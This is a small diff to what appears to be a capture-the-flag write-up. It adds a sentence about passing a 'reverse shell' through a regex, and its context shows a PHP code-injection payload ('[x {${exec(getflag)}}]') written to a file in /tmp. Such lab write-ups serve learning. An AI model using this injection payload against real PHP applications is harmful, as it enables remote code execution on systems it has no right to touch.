@@ -71,6 +71,8 @@ blablaoublablaou
 
 ## Exploit
 
+To exploit this you have to pass a `reverse shell` that go trew the `regex` and redirect the output somewhere you can read it.
+
 ````shell
 echo "[x {${exec(getflag)}}]" > /tmp/php_rce
 ````
